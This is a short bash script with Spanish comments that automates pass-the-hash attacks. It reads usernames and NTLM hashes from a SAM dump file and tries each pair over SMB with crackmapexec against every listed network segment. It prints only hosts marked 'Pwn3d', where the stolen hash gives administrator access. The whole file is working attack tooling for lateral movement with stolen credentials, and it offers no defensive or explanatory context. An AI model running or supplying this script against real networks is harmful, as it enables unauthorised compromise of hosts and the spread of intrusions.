#!/usr/bin/bash
#PTH
########################################## EJEMPLO DE USO ##########################################
if [ "$1" == "" ]; then
	echo 
	echo "Example: `basename $0` samfile segmentos" 
	exit 0
fi



########################################## VALIDACION DE CME ##########################################
cme=$(which crackmapexec)
if [ "$?" == "1" ]; then
	echo "No se encontro Crackmapexec... Intenta con  sudo apt install crackmapexec"
	exit 0
fi

for sam in $(cat $1)
do
        user=$(echo $sam | awk '{print $1}' FS=":" )
        hash=$(echo $sam | awk '{print $3,$4}' FS=":" |tr ' ' ':')
        echo $user
        echo $hash

        for segmento in $(cat $2)
        do
                echo $segmento
                crackmapexec smb $segmento -u $user -H $hash --local-auth | grep Pwn3d

        done
        sleep 1
done   
